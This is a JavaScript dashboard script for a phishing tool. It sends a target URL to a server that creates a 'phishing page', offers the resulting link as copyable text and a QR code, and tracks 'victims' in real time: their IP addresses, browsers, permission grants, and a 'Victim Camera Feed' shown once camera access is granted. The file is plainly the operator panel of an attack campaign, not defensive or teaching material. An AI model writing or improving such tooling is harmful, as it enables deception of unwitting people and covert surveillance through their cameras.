document.addEventListener('DOMContentLoaded', function() {
    console.log("🟢 Dashboard JS Loaded!"); // <-- DEBUG 1
    
    const socket = io();
    
    // Create form submission
    const createForm = document.getElementById('create-form');
    console.log("🔍 Form found:", createForm); // <-- DEBUG 2

    if (createForm) {
        createForm.addEventListener('submit', function(e) {
            console.log("✅ Form submitted!"); // <-- DEBUG 3
            e.preventDefault();
            
            const targetUrl = document.getElementById('target-url').value;
            console.log("🔍 Target URL from input:", targetUrl); // <-- DEBUG 4
            
            const btn = this.querySelector('button[type="submit"]');
            const originalText = btn.textContent;
            
            btn.textContent = 'Creating...';
            btn.disabled = true;
            
            const formData = new FormData();
            formData.append('target_url', targetUrl);

            fetch('/create', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log("📡 Received response from server, status:", response.status); // <-- DEBUG 5
                return response.json();
            })
            .then(data => {
                console.log("📡 Response JSON from server:", data); // <-- DEBUG 6
                if (data.success) {
                    document.getElementById('result-url').value = window.location.origin + data.url;
                    document.getElementById('result-container').classList.remove('d-none');
                    document.getElementById('placeholder').classList.add('d-none');
                    
                    showNotification('Phishing page created successfully!', 'success');
                    
                    // Focus the input field
                    document.getElementById('result-url').focus();
                    document.getElementById('result-url').select();
                } else {
                    console.error("🔥 Server returned an error:", data.error); // <-- DEBUG 7
                    showNotification('Error: ' + data.error, 'danger');
                    document.getElementById('placeholder').classList.remove('d-none');
                }
            })
            .catch(error => {
                console.error('🔥 Fetch error:', error); // <-- DEBUG 8
                showNotification('Connection error. Check console.', 'danger');
                document.getElementById('placeholder').classList.remove('d-none');
            })
            .finally(() => {
                btn.textContent = originalText;
                btn.disabled = false;
            });
        });
    } else {
        console.error("❌ ERROR: Form with ID 'create-form' not found!"); // <-- DEBUG 9
    }
    
    // Copy URL functionality
    document.getElementById('copy-btn')?.addEventListener('click', function() {
        const urlInput = document.getElementById('result-url');
        urlInput.select();
        document.execCommand('copy');
        showNotification('URL copied to clipboard!', 'success');
    });
    
    // QR Code generation
    document.getElementById('qr-btn')?.addEventListener('click', function() {
        const url = document.getElementById('result-url').value;
        if (url) {
            const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(url)}`;
            const qrModal = new bootstrap.Modal(document.getElementById('qrModal'));
            document.getElementById('qr-image').src = qrUrl;
            qrModal.show();
        }
    });
    
    // Delete campaign
    document.getElementById('delete-btn')?.addEventListener('click', function() {
        if (confirm('Are you sure you want to delete this campaign?')) {
            document.getElementById('result-container').classList.add('d-none');
            document.getElementById('placeholder').classList.remove('d-none');
            document.getElementById('target-url').value = '';
            showNotification('Campaign deleted successfully!', 'info');
        }
    });
    
    // Listen for victim activity updates
    socket.on('update', function(data) {
        console.log('Received victim activity:', data);
        addVictimCard(data);
    });
    
    // Listen for permission updates
    socket.on('permission_update', function(data) {
        console.log('Received permission update:', data);
        updateVictimCard(data.campaign_id, 'permission', data.permission);
    });
    
    // Listen for media access updates
    socket.on('media_access_granted', function(data) {
        console.log('Media access granted:', data);
        showMediaAccessAlert(data);
        updateVictimCard(data.campaign_id, 'media', 'access_granted');
    });
});

// Simple notification function
function showNotification(message, type) {
    const alertDiv = document.createElement('div');
    alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
    alertDiv.innerHTML = `
        \${message}
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    `;
    
    const container = document.querySelector('.container');
    container.insertBefore(alertDiv, container.firstChild);
    
    // Auto remove after 5 seconds
    setTimeout(() => {
        alertDiv.remove();
    }, 5000);
}

// Function to add or update victim card
function addVictimCard(data) {
    const container = document.getElementById('victims-container');
    
    // Check if card already exists
    let card = document.getElementById(`victim-${data.campaign_id}`);
    
    if (!card) {
        // Create new card if it doesn't exist
        card = document.createElement('div');
        card.className = 'card mb-3 victim-card';
        card.id = `victim-${data.campaign_id}`;
        container.appendChild(card);
    }
    
    // Update card content
    card.innerHTML = `
        <div class="card-header d-flex justify-content-between align-items-center">
            <h5 class="mb-0">Victim Activity</h5>
            <span class="badge bg-success">Active</span>
        </div>
        <div class="card-body">
            <div class="row">
                <div class="col-md-6">
                    <p><strong>Campaign ID:</strong> \${data.campaign_id}</p>
                    <p><strong>IP Address:</strong> \${data.ip || 'Unknown'}</p>
                    <p><strong>Browser:</strong> \${data.user_agent || 'Unknown'}</p>
                </div>
                <div class="col-md-6">
                    <p><strong>Last Action:</strong> \${data.action || 'Unknown'}</p>
                    <p><strong>Timestamp:</strong> \${new Date(data.timestamp).toLocaleString()}</p>
                    <p><strong>Permission:</strong> <span id="permission-\${data.campaign_id}">Pending</span></p>
                    <p><strong>Media Access:</strong> <span id="media-\${data.campaign_id}">Not Requested</span></p>
                </div>
            </div>
            <div class="mt-3">
                <h6>Activity Log:</h6>
                <div id="activity-log-\${data.campaign_id}" class="activity-log">
                    <div class="activity-item">${data.action || 'Page loaded'} - ${new Date(data.timestamp).toLocaleString()}</div>
                </div>
            </div>
        </div>
    `;
}

// Function to update victim card with new information
function updateVictimCard(campaignId, type, value) {
    const elementId = type === 'permission' ? `permission-${campaignId}` : `media-${campaignId}`;
    const element = document.getElementById(elementId);
    
    if (element) {
        if (type === 'permission') {
            element.textContent = value === 'allowed' ? 'Granted' : 'Blocked';
            element.className = value === 'allowed' ? 'badge bg-success' : 'badge bg-danger';
        } else if (type === 'media') {
            element.textContent = value === 'access_granted' ? 'Granted' : 'Denied';
            element.className = value === 'access_granted' ? 'badge bg-success' : 'badge bg-danger';
        }
    }
    
    // Add to activity log
    const logElement = document.getElementById(`activity-log-${campaignId}`);
    if (logElement) {
        const logItem = document.createElement('div');
        logItem.className = 'activity-item';
        logItem.textContent = `${type === 'permission' ? 'Permission' : 'Media Access'} ${value} - ${new Date().toLocaleString()}`;
        logElement.appendChild(logItem);
    }
}

// Function to show media access alert
function showMediaAccessAlert(data) {
    // Create a modal to show the media stream
    const modal = document.createElement('div');
    modal.className = 'modal fade';
    modal.id = `media-modal-\${data.campaign_id}`;
    modal.innerHTML = `
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title">Media Access Granted</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <p>Victim has granted media access. You can now view their camera feed.</p>
                    <img src="${data.media_stream_url}" alt="Victim Camera Feed" class="img-fluid">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                </div>
            </div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    // Show the modal
    const bsModal = new bootstrap.Modal(modal);
    bsModal.show();
    
    // Remove modal from DOM after it's hidden
    modal.addEventListener('hidden.bs.modal', function() {
        document.body.removeChild(modal);
    });
}
